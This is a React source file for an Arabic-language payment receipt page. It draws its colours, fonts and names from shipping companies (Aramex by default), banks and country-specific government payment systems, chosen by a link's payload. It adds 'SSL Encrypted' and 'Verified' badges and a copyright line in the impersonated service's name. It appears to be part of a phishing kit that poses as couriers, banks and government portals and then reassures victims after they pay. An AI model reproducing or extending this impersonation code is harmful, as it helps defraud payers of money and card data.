import { useParams } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { usePayment, useLink } from "@/hooks/useSupabase";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency } from "@/lib/countryCurrencies";
import { shippingCompanyBranding } from "@/lib/brandingSystem";
import { bankBranding } from "@/lib/brandingSystem";
import { CheckCircle2, Download, Home, Share2, Package, Calendar, CreditCard, Building2, Sparkles, ShieldCheck, Lock } from "lucide-react";
import { getServiceBranding } from "@/lib/serviceLogos";
import { designSystem } from "@/lib/designSystem";
import PaymentMetaTags from "@/components/PaymentMetaTags";
import { getBankById } from "@/lib/banks";
import BankLogo from "@/components/BankLogo";
import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
import { isGovernmentService } from "@/lib/governmentPaymentServices";
import { getGovernmentLayout } from "@/components/GovernmentLayouts";
import { getNonGovPaymentGatewayVisuals, shouldUsePaymentGatewayVisuals } from "@/lib/nonGovPaymentGatewayVisuals";

const PaymentReceipt = () => {
  const { paymentId } = useParams();
  const { data: payment } = usePayment(paymentId);
  const { data: link } = useLink(payment?.link_id || undefined);
  
  if (!payment || !link) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <div className="animate-pulse text-xl">جاري التحميل...</div>
      </div>
    );
  }
  
  const countryData = getCountryByCode(link.country_code);
  if (!countryData) return null;
  
  const payload = link.payload;
  const selectedCountry = link.payload?.selectedCountry || link.country_code || "SA";
  const serviceKey = link.payload?.service_key || 'aramex';
  const serviceName = link.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  const companyBranding = shippingCompanyBranding[serviceKey.toLowerCase()] || null;
  
  const selectedBankId = link.payload?.selectedBank || '';
  const selectedBank = selectedBankId && selectedBankId !== 'skipped' ? getBankById(selectedBankId) : null;
  const selectedBankBranding = selectedBankId && selectedBankId !== 'skipped' ? bankBranding[selectedBankId] : null;
  
  // Check if government service
  const isGovService = isGovernmentService(serviceKey);
  const govSystem = getGovernmentPaymentSystem(selectedCountry);
  
  const useGatewayVisuals = !isGovService && shouldUsePaymentGatewayVisuals(serviceKey);
  const gatewayVisuals = useGatewayVisuals ? getNonGovPaymentGatewayVisuals(selectedCountry, serviceKey) : null;
  
  const primaryColor = isGovService ? govSystem.colors.primary : (gatewayVisuals?.colors.primary || selectedBankBranding?.colors?.primary || companyBranding?.colors.primary || branding.colors.primary);
  const secondaryColor = isGovService ? govSystem.colors.secondary : (gatewayVisuals?.colors.secondary || selectedBankBranding?.colors?.secondary || companyBranding?.colors.secondary || branding.colors.secondary);
  const surfaceColor = isGovService ? govSystem.colors.surface : (gatewayVisuals?.colors.surface || companyBranding?.colors.surface || '#F8F9FA');
  const fontFamily = isGovService ? govSystem.fonts.primaryAr : (gatewayVisuals?.fonts.primaryAr || companyBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif');
  
  const formattedAmount = formatCurrency(payment.amount, link.country_code);
  const formattedDate = new Date(payment.created_at).toLocaleDateString('ar-SA', {
    year: 'numeric',
    month: 'long',
    day: 'numeric',
    hour: '2-digit',
    minute: '2-digit'
  });
  
  if (isGovService) {
    const GovLayout = getGovernmentLayout(selectedCountry);
    return (
      <>
        <PaymentMetaTags 
          serviceKey={serviceKey}
          serviceName={serviceName}
          title={`إيصال الدفع - ${serviceName}`}
          customDescription={`تم تأكيد الدفع بنجاح - ${serviceName}`}
          amount={formattedAmount}
        />
        
        <GovLayout 
          countryCode={selectedCountry} 
          serviceName={govSystem.nameAr || serviceName}
          amount={formattedAmount}
        >
          <div className="text-center mb-8">
            <div className="w-20 h-20 rounded-full bg-green-100 flex items-center justify-center mx-auto mb-4 animate-in zoom-in">
              <CheckCircle2 className="w-10 h-10 text-green-600" />
            </div>
            <h2 className="text-2xl font-bold text-gray-900 mb-2">تم الدفع بنجاح</h2>
            <p className="text-gray-500">رقم العملية: <span className="font-mono">{payment.id.substring(0, 12).toUpperCase()}</span></p>
          </div>

          <div className="bg-gray-50 rounded-lg border border-gray-200 p-6 space-y-4 mb-8">
            <div className="flex justify-between items-center pb-4 border-b border-gray-200">
              <span className="text-gray-500">المبلغ المدفوع</span>
              <span className="text-xl font-bold text-gray-900">{formattedAmount}</span>
            </div>
            
            <div className="flex justify-between items-center text-sm">
              <span className="text-gray-500">التاريخ</span>
              <span className="text-gray-900" dir="ltr">{formattedDate}</span>
            </div>
            
            {selectedBank && (
              <div className="flex justify-between items-center text-sm">
                <span className="text-gray-500">البنك</span>
                <span className="text-gray-900 font-medium">{selectedBank.nameAr}</span>
              </div>
            )}
            
            <div className="flex justify-between items-center text-sm">
              <span className="text-gray-500">طريقة الدفع</span>
              <span className="text-gray-900">بطاقة •••• {payment.card_last4 || '****'}</span>
            </div>
          </div>

          <div className="grid grid-cols-2 gap-4">
            <Button variant="outline" className="h-12 border-gray-300">
              <Download className="w-4 h-4 ml-2" />
              تحميل
            </Button>
            <Button 
              className="h-12 text-white"
              style={{ background: govSystem.colors.primary }}
              onClick={() => (window.location.href = "/")}
            >
              <Home className="w-4 h-4 ml-2" />
              الرئيسية
            </Button>
          </div>
        </GovLayout>
      </>
    );
  }

  return (
    <>
      <PaymentMetaTags 
        serviceKey={serviceKey}
        serviceName={serviceName}
        title={`إيصال الدفع - ${serviceName}`}
        customDescription={`تم تأكيد الدفع بنجاح - ${serviceName}`}
        amount={formattedAmount}
      />

      {/* Full Screen Receipt */}
      <div 
        className="min-h-screen flex flex-col"
        dir="rtl"
        style={{
          background: `linear-gradient(135deg, ${surfaceColor}, #FFFFFF)`,
          fontFamily: fontFamily
        }}
      >
        {/* Header */}
        <div 
          className="w-full py-6 px-4 shadow-md"
          style={{
            background: '#FFFFFF',
            borderBottom: `3px solid ${primaryColor}`
          }}
        >
          <div className="container mx-auto max-w-4xl">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-4">
                <div 
                  className="w-12 h-12 rounded-full flex items-center justify-center"
                  style={{
                    background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`
                  }}
                >
                  <CheckCircle2 className="w-6 h-6 text-white" />
                </div>
                <div>
                  <h1 className="text-xl sm:text-2xl font-bold" style={{ color: designSystem.colors.neutral[900] }}>
                    إيصال الدفع
                  </h1>
                  <p className="text-sm text-gray-600">
                    {serviceName}
                  </p>
                </div>
              </div>
              
              <div className="flex items-center gap-2 px-3 py-1.5 rounded-full bg-green-50 border border-green-200">
                <CheckCircle2 className="w-4 h-4 text-green-600" />
                <span className="text-xs font-medium text-green-700">مكتمل</span>
              </div>
            </div>
          </div>
        </div>

        {/* Main Content */}
        <div className="flex-1 py-12">
          <div className="container mx-auto px-4 max-w-3xl">
            {/* Success Message */}
            <div className="text-center mb-10">
              <div 
                className="w-24 h-24 rounded-full flex items-center justify-center mx-auto mb-6"
                style={{
                  background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`,
                  boxShadow: `0 8px 24px ${primaryColor}40`
                }}
              >
                <CheckCircle2 className="w-12 h-12 text-white" strokeWidth={2.5} />
              </div>
              <h2 
                className="text-3xl sm:text-4xl font-bold mb-3"
                style={{ 
                  color: designSystem.colors.neutral[900],
                  fontFamily: designSystem.typography.fontFamilies.arabic
                }}
              >
                تم الدفع بنجاح!
              </h2>
              <p className="text-lg text-gray-600">
                شكراً لك، تم تأكيد عملية الدفع
              </p>
            </div>
            
            {/* Receipt Card */}
            <Card 
              className="overflow-hidden border-0"
              style={{ 
                boxShadow: '0 8px 32px rgba(0,0,0,0.1)',
                borderRadius: '20px'
              }}
            >
              {/* Receipt Header */}
              <div 
                className="px-6 sm:px-10 py-8 text-center"
                style={{
                  background: `linear-gradient(135deg, ${primaryColor}15, ${secondaryColor}15)`,
                  borderBottom: `2px solid ${primaryColor}30`
                }}
              >
                <Badge 
                  className="text-sm px-5 py-2 mb-4"
                  style={{
                    background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`,
                    color: '#FFFFFF'
                  }}
                >
                  <CheckCircle2 className="w-4 h-4 ml-2" />
                  <span>مدفوع</span>
                </Badge>
                
                <p className="text-sm text-gray-600 mb-2">
                  رقم الإيصال
                </p>
                <p 
                  className="text-3xl font-bold"
                  style={{ 
                    color: primaryColor,
                    fontFamily: 'monospace'
                  }}
                >
                  #{payment.id.substring(0, 12).toUpperCase()}
                </p>
              </div>
              
              {/* Payment Details */}
              <div className="px-6 sm:px-10 py-8 bg-white">
                <div className="space-y-5">
                  {/* Service */}
                  <div className="flex items-center justify-between py-4 border-b">
                    <div className="flex items-center gap-3 text-gray-600">
                      <Package className="w-5 h-5" />
                      <span className="text-base">الخدمة</span>
                    </div>
                    <span className="font-bold text-base">{serviceName}</span>
                  </div>
                  
                  {/* Bank */}
                  {selectedBank && (
                    <div className="flex items-center justify-between py-4 border-b">
                      <div className="flex items-center gap-3 text-gray-600">
                        <Building2 className="w-5 h-5" />
                        <span className="text-base">البنك</span>
                      </div>
                      <div className="flex items-center gap-2">
                        <span className="font-semibold text-base">{selectedBank.nameAr}</span>
                      </div>
                    </div>
                  )}
                  
                  {/* Payment Method */}
                  <div className="flex items-center justify-between py-4 border-b">
                    <div className="flex items-center gap-3 text-gray-600">
                      <CreditCard className="w-5 h-5" />
                      <span className="text-base">طريقة الدفع</span>
                    </div>
                    <span className="font-semibold text-base">
                      بطاقة •••• {payment.card_last4 || '****'}
                    </span>
                  </div>
                  
                  {/* Date */}
                  <div className="flex items-center justify-between py-4 border-b">
                    <div className="flex items-center gap-3 text-gray-600">
                      <Calendar className="w-5 h-5" />
                      <span className="text-base">التاريخ والوقت</span>
                    </div>
                    <span className="font-semibold text-base" dir="ltr">
                      {formattedDate}
                    </span>
                  </div>
                  
                  {/* Amount */}
                  <div 
                    className="flex items-center justify-between py-6 px-6 rounded-2xl mt-6"
                    style={{
                      background: `linear-gradient(135deg, ${primaryColor}15, ${secondaryColor}15)`
                    }}
                  >
                    <span className="text-xl font-bold">المبلغ المدفوع</span>
                    <span className="text-3xl font-bold" style={{ color: primaryColor }}>
                      {formattedAmount}
                    </span>
                  </div>
                </div>
              </div>
            </Card>
            
            {/* Action Buttons */}
            <div className="mt-8 space-y-4">
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                <Button 
                  size="lg" 
                  variant="outline"
                  className="py-6 text-base font-semibold rounded-xl"
                  style={{
                    borderColor: `${primaryColor}50`,
                    color: primaryColor
                  }}
                >
                  <Download className="w-5 h-5 ml-2" />
                  <span>تحميل الإيصال</span>
                </Button>
                
                <Button 
                  size="lg" 
                  variant="outline"
                  className="py-6 text-base font-semibold rounded-xl"
                  style={{
                    borderColor: `${primaryColor}50`,
                    color: primaryColor
                  }}
                >
                  <Share2 className="w-5 h-5 ml-2" />
                  <span>مشاركة</span>
                </Button>
              </div>
              
              <Button
                size="lg"
                className="w-full py-7 text-lg font-bold text-white rounded-xl"
                onClick={() => (window.location.href = "/")}
                style={{
                  background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`,
                  boxShadow: `0 8px 20px ${primaryColor}40`
                }}
              >
                <Home className="w-6 h-6 ml-2" />
                <span>العودة للرئيسية</span>
              </Button>
              
              <p className="text-sm text-center text-gray-500 mt-6">
                سيتم إرسال نسخة من الإيصال إلى بريدك الإلكتروني
              </p>
            </div>

            {/* Footer */}
            <div className="mt-12 text-center">
              <div className="flex items-center justify-center gap-4 text-xs text-gray-500 mb-3">
                <div className="flex items-center gap-1.5">
                  <Lock className="w-3.5 h-3.5" />
                  <span>SSL Encrypted</span>
                </div>
                <span>•</span>
                <div className="flex items-center gap-1.5">
                  <ShieldCheck className="w-3.5 h-3.5" />
                  <span>Verified</span>
                </div>
              </div>
              <p className="text-xs text-gray-400">
                © 2025 {serviceName}. جميع الحقوق محفوظة.
              </p>
            </div>
          </div>
        </div>
      </div>
    </>
  );
};

export default PaymentReceipt;
